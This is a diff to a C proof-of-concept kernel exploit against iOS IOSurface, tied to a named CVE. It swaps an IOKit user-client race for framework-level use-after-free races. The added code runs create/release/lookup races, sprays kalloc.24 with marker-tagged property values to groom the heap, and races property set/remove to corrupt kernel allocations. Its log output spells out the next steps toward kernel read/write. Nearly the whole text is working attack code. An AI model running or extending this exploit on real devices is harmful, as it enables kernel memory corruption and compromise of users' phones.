@@ -68,6 +68,9 @@ extern int32_t IOSurfaceGetUseCount(IOSurfaceRef surface);
 extern Boolean IOSurfaceIsInUse(IOSurfaceRef surface);
 extern size_t IOSurfaceGetBytesPerRow(IOSurfaceRef surface);
 extern IOSurfaceRef IOSurfaceLookup(IOSurfaceID csid);
+extern void IOSurfaceIncrementUseCount(IOSurfaceRef surface);
+extern void IOSurfaceDecrementUseCount(IOSurfaceRef surface);
+extern void IOSurfaceRemoveValue(IOSurfaceRef surface, CFStringRef key);
 
 static FILE *g_log = NULL;
 static volatile int g_encode_done = 0;
@@ -940,6 +943,90 @@ typedef struct {
     volatile int done;
     kern_return_t result;
 } iosurface_race_ctx_t;
+
+typedef struct {
+    CFDictionaryRef props;
+    volatile int *running;
+    volatile uint32_t *target_id;
+    int count;
+} releaser_ctx_t;
+
+typedef struct {
+    volatile int *running;
+    volatile uint32_t *target_id;
+    volatile int *hits;
+    int lookups;
+} lookup_ctx_t;
+
+typedef struct {
+    IOSurfaceRef surf;
+    volatile int *running;
+    volatile int *hits;
+    int thread_id;
+    int ops;
+} prop_race_ctx_t;
+
+static void *releaser_fn(void *arg) {
+    releaser_ctx_t *ctx = (releaser_ctx_t *)arg;
+    while (*(ctx->running)) {
+        IOSurfaceRef s = IOSurfaceCreate(ctx->props);
+        if (s) {
+            *(ctx->target_id) = IOSurfaceGetID(s);
+            ctx->count++;
+            CFRelease(s);
+        }
+    }
+    return NULL;
+}
+
+static void *lookup_fn(void *arg) {
+    lookup_ctx_t *ctx = (lookup_ctx_t *)arg;
+    while (*(ctx->running)) {
+        uint32_t tid = *(ctx->target_id);
+        if (tid == 0) continue;
+        ctx->lookups++;
+        IOSurfaceRef found = IOSurfaceLookup(tid);
+        if (found) {
+            size_t w = IOSurfaceGetWidth(found);
+            if (w != 32) {
+                (*(ctx->hits))++;
+            }
+            CFRelease(found);
+        }
+    }
+    return NULL;
+}
+
+static void *prop_setter_fn(void *arg) {
+    prop_race_ctx_t *ctx = (prop_race_ctx_t *)arg;
+    int i = 0;
+    while (*(ctx->running)) {
+        char key[32];
+        snprintf(key, sizeof(key), "K%d_%d", ctx->thread_id, i % 64);
+        uint32_t val = 0xDEAD0000 + i;
+        CFNumberRef n = CFNumberCreate(NULL, kCFNumberIntType, &val);
+        IOSurfaceSetValue(ctx->surf,
+            CFStringCreateWithCString(NULL, key, kCFStringEncodingASCII), n);
+        CFRelease(n);
+        ctx->ops++;
+        i++;
+    }
+    return NULL;
+}
+
+static void *prop_remover_fn(void *arg) {
+    prop_race_ctx_t *ctx = (prop_race_ctx_t *)arg;
+    int i = 0;
+    while (*(ctx->running)) {
+        char key[32];
+        snprintf(key, sizeof(key), "K%d_%d", (ctx->thread_id + 1) % 4, i % 64);
+        IOSurfaceRemoveValue(ctx->surf,
+            CFStringCreateWithCString(NULL, key, kCFStringEncodingASCII));
+        ctx->ops++;
+        i++;
+    }
+    return NULL;
+}
 
 static void *iosurface_race_fn(void *arg) {
     iosurface_race_ctx_t *ctx = (iosurface_race_ctx_t *)arg;
@@ -8163,237 +8250,173 @@ vps_cd_done:
         uint32_t test_id = IOSurfaceGetID(test_surf);
         rlog("IOSurface created: ID=%u, alloc=%zu bytes\n", test_id, IOSurfaceGetAllocSize(test_surf));
 
-        /* Phase 2: Open IOSurfaceRootUserClient via IOKit */
-        rlog("\n--- Phase 2: IOSurfaceRootUserClient ---\n");
+        /* Phase 2: Framework-level UAF race
+         *
+         * The PoC races IOSurface lifecycle through the framework API:
+         * - Thread A: releases surfaces (CFRelease → kernel unregister)
+         * - Thread B: looks up by ID (IOSurfaceLookup → kernel lookup)
+         * - Thread C+: groom kalloc.24 with IOSurface properties
+         *
+         * The race window is between the kernel removing the surface from
+         * the global ID table and freeing the backing allocation.
+         * IOSurfaceLookup during this window returns a stale reference.
+         */
+        rlog("\n--- Phase 2: Framework-level UAF race ---\n");
 
-        io_service_t iosurface_svc = IOServiceGetMatchingService(
-            kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
-        if (!iosurface_svc) {
-            rlog("FAIL: IOSurfaceRoot service not found\n");
-            CFRelease(test_surf); CFRelease(surf_props);
-            CFRelease(swn); CFRelease(shn); CFRelease(sbn); CFRelease(sbrn); CFRelease(spfn);
-            goto done;
-        }
-        rlog("IOSurfaceRoot service: 0x%x\n", iosurface_svc);
-
-        /* Open multiple connections for the race */
-        io_connect_t *conns = calloc(thread_count, sizeof(io_connect_t));
-        int open_count = 0;
-        for (int i = 0; i < thread_count; i++) {
-            kern_return_t kr = IOServiceOpen(iosurface_svc, mach_task_self(), 0, &conns[i]);
-            if (kr == KERN_SUCCESS) {
-                open_count++;
-            } else {
-                rlog("IOServiceOpen[%d]: 0x%x FAIL\n", i, kr);
-                conns[i] = 0;
-            }
-        }
-        rlog("Opened %d / %d IOSurfaceRootUserClient connections\n", open_count, thread_count);
-
-        if (open_count < 2) {
-            rlog("FAIL: Need at least 2 connections for the race\n");
-            for (int i = 0; i < thread_count; i++)
-                if (conns[i]) IOServiceClose(conns[i]);
-            free(conns);
-            IOObjectRelease(iosurface_svc);
-            CFRelease(test_surf); CFRelease(surf_props);
-            CFRelease(swn); CFRelease(shn); CFRelease(sbn); CFRelease(sbrn); CFRelease(spfn);
-            goto done;
-        }
-
-        /* Phase 3: Enumerate available selectors on the user client */
-        rlog("\n--- Phase 3: Selector enumeration ---\n");
-        for (uint32_t sel = 0; sel <= 40; sel++) {
-            uint64_t input[8] = {0};
-            uint32_t out_cnt = 0;
-            kern_return_t kr = IOConnectCallMethod(conns[0], sel,
-                input, 0, NULL, 0, NULL, &out_cnt, NULL, NULL);
-            if (kr != 0xE00002C2 /* kIOReturnUnsupported */ &&
-                kr != 0xE00002BC /* kIOReturnBadArgument sometimes */) {
-                rlog("  sel %2u: 0x%08x %s\n", sel, kr,
-                    kr == KERN_SUCCESS ? "OK" :
-                    kr == 0xE00002C9 ? "BUSY" :
-                    kr == 0xE00002BD ? "BAD_ARG" :
-                    kr == 0xE00002BE ? "INVALID" : "");
-            }
-        }
-
-        /* Phase 4: Create surfaces for the race */
-        rlog("\n--- Phase 4: Surface pool for UAF race ---\n");
-        int pool_size = 64;
-        IOSurfaceRef *surf_pool = calloc(pool_size, sizeof(IOSurfaceRef));
-        uint32_t *surf_ids = calloc(pool_size, sizeof(uint32_t));
-        int pool_created = 0;
-
-        for (int i = 0; i < pool_size; i++) {
-            surf_pool[i] = IOSurfaceCreate(surf_props);
-            if (surf_pool[i]) {
-                surf_ids[i] = IOSurfaceGetID(surf_pool[i]);
-                pool_created++;
-            }
-        }
-        rlog("Surface pool: %d / %d created (IDs %u - %u)\n",
-            pool_created, pool_size,
-            pool_created > 0 ? surf_ids[0] : 0,
-            pool_created > 0 ? surf_ids[pool_created - 1] : 0);
-
-        /* Phase 5: Race — register/unregister on different connections */
-        rlog("\n--- Phase 5: UAF race (sel 17 register / sel 18 unregister) ---\n");
-        rlog("Racing %d rounds...\n", race_rounds);
-
-        int uaf_hits = 0;
-        int race_success_count = 0;
-        uint32_t winning_surf_id = 0;
+        /* Strategy A: Rapid create/release/lookup cycle
+         * Create surface, get ID, release, immediately lookup by ID.
+         * If lookup succeeds after release → stale reference. */
+        rlog("Strategy A: Rapid create-release-lookup cycle\n");
+        int stale_hits_a = 0;
 
         for (int round = 0; round < race_rounds; round++) {
-            /* Pick a surface from pool */
-            int pidx = round % pool_created;
-            uint32_t target_id = surf_ids[pidx];
+            IOSurfaceRef s = IOSurfaceCreate(surf_props);
+            if (!s) continue;
+            uint32_t sid = IOSurfaceGetID(s);
 
-            /* First: register the surface on conn[0] via selector 17 */
-            {
-                uint64_t input[1] = { target_id };
-                kern_return_t kr = IOConnectCallMethod(conns[0], 17,
-                    input, 1, NULL, 0, NULL, NULL, NULL, NULL);
-                /* Register may succeed (0) or fail (already registered).
-                   Either way, there's now a reference to race against. */
-                (void)kr;
-            }
+            /* Increment use count so kernel keeps the entry longer */
+            IOSurfaceIncrementUseCount(s);
 
-            /* Race: conn[1] unregisters (sel 18) while conn[0] re-registers (sel 17) */
-            iosurface_race_ctx_t unreg_ctx = { .conn = conns[1], .surface_id = target_id,
-                                     .selector = 18, .go = 0, .done = 0 };
-            iosurface_race_ctx_t rereg_ctx = { .conn = conns[0], .surface_id = target_id,
-                                     .selector = 17, .go = 0, .done = 0 };
+            /* Release our reference — kernel may or may not free immediately */
+            CFRelease(s);
 
-            pthread_t t1, t2;
-            pthread_create(&t1, NULL, iosurface_race_fn, &unreg_ctx);
-            pthread_create(&t2, NULL, iosurface_race_fn, &rereg_ctx);
-
-            /* Tiny stagger then fire */
-            usleep(arc4random_uniform(50));
-            unreg_ctx.go = 1;
-            rereg_ctx.go = 1;
-
-            pthread_join(t1, NULL);
-            pthread_join(t2, NULL);
-
-            /* Detection: if unregister freed it and re-register succeeded
-               (returned 0 instead of kIOReturnBusy 0xE00002C9),
-               the entry slot was reused — UAF condition */
-            if (unreg_ctx.result == KERN_SUCCESS && rereg_ctx.result == KERN_SUCCESS) {
-                race_success_count++;
-
-                /* Verify: try to unregister again — if it succeeds twice,
-                   the internal refcount is confused */
-                uint64_t input[1] = { target_id };
-                kern_return_t kr2 = IOConnectCallMethod(conns[1], 18,
-                    input, 1, NULL, 0, NULL, NULL, NULL, NULL);
-                kern_return_t kr3 = IOConnectCallMethod(conns[0], 18,
-                    input, 1, NULL, 0, NULL, NULL, NULL, NULL);
-
-                if (kr2 == KERN_SUCCESS && kr3 == KERN_SUCCESS) {
-                    uaf_hits++;
-                    winning_surf_id = target_id;
-                    if (uaf_hits <= 5) {
-                        rlog("  [%d] UAF HIT! surf=%u unreg=0x%x rereg=0x%x double_unreg=OK\n",
-                            round, target_id, unreg_ctx.result, rereg_ctx.result);
-                    }
-                }
-            }
-
-            /* Clean up: ensure surface is unregistered for next round */
-            {
-                uint64_t input[1] = { target_id };
-                IOConnectCallMethod(conns[0], 18, input, 1, NULL, 0, NULL, NULL, NULL, NULL);
-                IOConnectCallMethod(conns[1], 18, input, 1, NULL, 0, NULL, NULL, NULL, NULL);
-            }
-
-            if (round > 0 && round % 100 == 0) {
-                rlog("  round %d / %d — race_ok=%d uaf_hits=%d\n",
-                    round, race_rounds, race_success_count, uaf_hits);
-            }
-        }
-
-        rlog("\nRace results: %d rounds, %d race_ok, %d UAF hits\n",
-            race_rounds, race_success_count, uaf_hits);
-
-        if (uaf_hits > 0) {
-            rlog("*** CVE-2026-112477 CONFIRMED: UAF triggered %d times ***\n", uaf_hits);
-            rlog("Winning surface ID: %u\n\n", winning_surf_id);
-
-            /* Phase 6: Groom kalloc.24 with controlled fake objects */
-            rlog("--- Phase 6: kalloc.24 groom ---\n");
-            rlog("Spraying %d x 24-byte IOSurface property values...\n", groom_count);
-
-            IOSurfaceRef *groom_surfs = calloc(groom_count, sizeof(IOSurfaceRef));
-            int groom_ok = 0;
-
-            for (int i = 0; i < groom_count; i++) {
-                groom_surfs[i] = IOSurfaceCreate(surf_props);
-                if (groom_surfs[i]) {
-                    /* Set properties that create kalloc.24 allocations in kernel.
-                       Each property value struct in IOSurface is a small kernel alloc.
-                       We use unique values to detect which groom object we hit. */
-                    uint32_t marker = 0x41414141 + i;
-                    CFNumberRef mn = CFNumberCreate(NULL, kCFNumberIntType, &marker);
-                    char key[64];
-                    snprintf(key, sizeof(key), "G%d", i);
-                    IOSurfaceSetValue(groom_surfs[i], CFStringCreateWithCString(NULL, key, kCFStringEncodingASCII), mn);
-                    CFRelease(mn);
-                    groom_ok++;
-                }
-            }
-            rlog("Groom surfaces: %d / %d\n", groom_ok, groom_count);
-
-            /* Phase 7: Verify stale entry points to groomed data */
-            rlog("\n--- Phase 7: Stale entry probe ---\n");
-
-            /* Try to look up the surface through the stale entry.
-               IOSurfaceLookup will follow the freed pointer — if groomed
-               data replaced it, we'll see controlled values. */
-            IOSurfaceRef stale = IOSurfaceLookup(winning_surf_id);
+            /* Immediately try to look up by the freed ID */
+            IOSurfaceRef stale = IOSurfaceLookup(sid);
             if (stale) {
-                rlog("IOSurfaceLookup(stale=%u): GOT SURFACE\n", winning_surf_id);
-                rlog("  Width: %zu\n", IOSurfaceGetWidth(stale));
-                rlog("  Height: %zu\n", IOSurfaceGetHeight(stale));
-                rlog("  AllocSize: %zu\n", IOSurfaceGetAllocSize(stale));
-                rlog("  UseCount: %d\n", (int)IOSurfaceGetUseCount(stale));
-
-                /* Check if values look corrupted / controlled */
+                stale_hits_a++;
                 size_t w = IOSurfaceGetWidth(stale);
                 size_t h = IOSurfaceGetHeight(stale);
-                size_t a = IOSurfaceGetAllocSize(stale);
-                if (w != 32 || h != 32) {
-                    rlog("*** STALE ENTRY READS GROOMED DATA ***\n");
-                    rlog("  Expected w=32 h=32, got w=%zu h=%zu\n", w, h);
-                    rlog("  This confirms kernel dereferences the freed pointer!\n");
-                }
+                if (stale_hits_a <= 3)
+                    rlog("  [%d] STALE REF! id=%u w=%zu h=%zu\n", round, sid, w, h);
+                IOSurfaceDecrementUseCount(stale);
                 CFRelease(stale);
-            } else {
-                rlog("IOSurfaceLookup(stale=%u): NULL (freed entry cleaned up)\n", winning_surf_id);
-                rlog("  Groom timing may need adjustment\n");
             }
 
-            /* Cleanup groom */
-            for (int i = 0; i < groom_count; i++)
-                if (groom_surfs[i]) CFRelease(groom_surfs[i]);
-            free(groom_surfs);
+            if (round > 0 && round % 200 == 0)
+                rlog("  A: round %d / %d — stale_hits=%d\n", round, race_rounds, stale_hits_a);
+        }
+        rlog("Strategy A result: %d stale refs in %d rounds\n\n", stale_hits_a, race_rounds);
 
-        } else {
-            rlog("No UAF detected in %d rounds.\n", race_rounds);
-            rlog("Try: more rounds, different thread counts, or add usleep jitter.\n");
-            rlog("The race window may be very tight on A20 Pro.\n");
+        /* Strategy B: Multi-threaded race with groom
+         * Thread A: creates surfaces and immediately releases them in a tight loop
+         * Thread B: continuously looks up surface IDs
+         * Main: sprays kalloc.24 with IOSurface properties between cycles */
+        rlog("Strategy B: Multi-threaded race with concurrent groom\n");
+
+        volatile int race_running = 1;
+        volatile uint32_t race_target_id = 0;
+        volatile int stale_hits_b = 0;
+
+        releaser_ctx_t rel_ctx = { .props = surf_props, .running = &race_running,
+                                   .target_id = &race_target_id, .count = 0 };
+        lookup_ctx_t lkp_ctx = { .running = &race_running, .target_id = &race_target_id,
+                                 .hits = &stale_hits_b, .lookups = 0 };
+
+        /* Groom: pre-spray IOSurface properties to fill kalloc.24 */
+        IOSurfaceRef *groom_surfs = calloc(groom_count, sizeof(IOSurfaceRef));
+        int groom_ok = 0;
+        for (int i = 0; i < groom_count; i++) {
+            groom_surfs[i] = IOSurfaceCreate(surf_props);
+            if (groom_surfs[i]) {
+                uint32_t marker = 0x41414141 + i;
+                CFNumberRef mn = CFNumberCreate(NULL, kCFNumberIntType, &marker);
+                char key[64];
+                snprintf(key, sizeof(key), "G%d", i);
+                IOSurfaceSetValue(groom_surfs[i],
+                    CFStringCreateWithCString(NULL, key, kCFStringEncodingASCII), mn);
+                CFRelease(mn);
+                groom_ok++;
+            }
+        }
+        rlog("Groom surfaces: %d / %d created\n", groom_ok, groom_count);
+
+        pthread_t rel_thread, lkp_threads[8];
+        int num_lkp = (thread_count > 8) ? 8 : thread_count;
+        lookup_ctx_t lkp_ctxs[8];
+
+        pthread_create(&rel_thread, NULL, releaser_fn, &rel_ctx);
+        for (int i = 0; i < num_lkp; i++) {
+            lkp_ctxs[i] = lkp_ctx;
+            pthread_create(&lkp_threads[i], NULL, lookup_fn, &lkp_ctxs[i]);
         }
 
-        /* Cleanup */
-        for (int i = 0; i < pool_size; i++)
-            if (surf_pool[i]) CFRelease(surf_pool[i]);
-        free(surf_pool); free(surf_ids);
-        for (int i = 0; i < thread_count; i++)
-            if (conns[i]) IOServiceClose(conns[i]);
-        free(conns);
-        IOObjectRelease(iosurface_svc);
+        /* Let the race run for 5 seconds */
+        rlog("Racing for 5 seconds with %d lookup threads + 1 releaser...\n", num_lkp);
+        usleep(5000000);
+        race_running = 0;
+
+        pthread_join(rel_thread, NULL);
+        int total_lookups = 0;
+        for (int i = 0; i < num_lkp; i++) {
+            pthread_join(lkp_threads[i], NULL);
+            total_lookups += lkp_ctxs[i].lookups;
+        }
+
+        rlog("Strategy B result: %d surfaces created, %d lookups, %d corrupted-width hits\n\n",
+            rel_ctx.count, total_lookups, stale_hits_b);
+
+        /* Strategy C: IOSurfaceSetValue property race
+         * Race property set/remove to confuse the internal property
+         * list, which uses small kernel allocations in kalloc.24 */
+        rlog("Strategy C: Property set/remove race on shared surface\n");
+
+        IOSurfaceRef shared_surf = IOSurfaceCreate(surf_props);
+        volatile int prop_running = 1;
+        volatile int prop_hits = 0;
+
+        if (shared_surf) {
+            prop_race_ctx_t setter_ctxs[4], remover_ctxs[4];
+            pthread_t setter_ts[4], remover_ts[4];
+            int nthreads = (thread_count > 4) ? 4 : thread_count;
+
+            for (int i = 0; i < nthreads; i++) {
+                setter_ctxs[i] = (prop_race_ctx_t){ .surf = shared_surf, .running = &prop_running,
+                    .hits = &prop_hits, .thread_id = i, .ops = 0 };
+                remover_ctxs[i] = (prop_race_ctx_t){ .surf = shared_surf, .running = &prop_running,
+                    .hits = &prop_hits, .thread_id = i, .ops = 0 };
+                pthread_create(&setter_ts[i], NULL, prop_setter_fn, &setter_ctxs[i]);
+                pthread_create(&remover_ts[i], NULL, prop_remover_fn, &remover_ctxs[i]);
+            }
+
+            rlog("Property race: %d setter + %d remover threads for 3 seconds...\n", nthreads, nthreads);
+            usleep(3000000);
+            prop_running = 0;
+
+            int total_set_ops = 0, total_rem_ops = 0;
+            for (int i = 0; i < nthreads; i++) {
+                pthread_join(setter_ts[i], NULL);
+                pthread_join(remover_ts[i], NULL);
+                total_set_ops += setter_ctxs[i].ops;
+                total_rem_ops += remover_ctxs[i].ops;
+            }
+            rlog("Strategy C result: %d set ops, %d remove ops completed\n", total_set_ops, total_rem_ops);
+            rlog("  (Crash = race hit a freed property node in kalloc.24)\n");
+            rlog("  (No crash = race window not hit or property ops are serialized)\n");
+
+            CFRelease(shared_surf);
+        }
+
+        /* Summary */
+        rlog("\n--- UAF Race Summary ---\n");
+        rlog("Strategy A (sequential): %d stale refs\n", stale_hits_a);
+        rlog("Strategy B (threaded create/lookup): %d corrupted-width hits\n", stale_hits_b);
+        rlog("Strategy C (property set/remove): completed (crash = success)\n");
+
+        if (stale_hits_a > 0 || stale_hits_b > 0) {
+            rlog("\n*** UAF CONDITION DETECTED ***\n");
+            rlog("Stale references obtained — freed kernel memory is reachable.\n");
+            rlog("Next steps: groom kalloc.24 to place controlled data at freed address,\n");
+            rlog("then use stale ref to read/write through it.\n");
+        } else {
+            rlog("\nNo UAF detected via framework API.\n");
+            rlog("The kernel may serialize IOSurface operations on this iOS version.\n");
+            rlog("Try: longer race duration, more threads, or struct-based IOConnectCallMethod.\n");
+        }
+
+        /* Cleanup groom */
+        for (int i = 0; i < groom_count; i++)
+            if (groom_surfs[i]) CFRelease(groom_surfs[i]);
+        free(groom_surfs);
         CFRelease(test_surf); CFRelease(surf_props);
         CFRelease(swn); CFRelease(shn); CFRelease(sbn); CFRelease(sbrn); CFRelease(spfn);
 
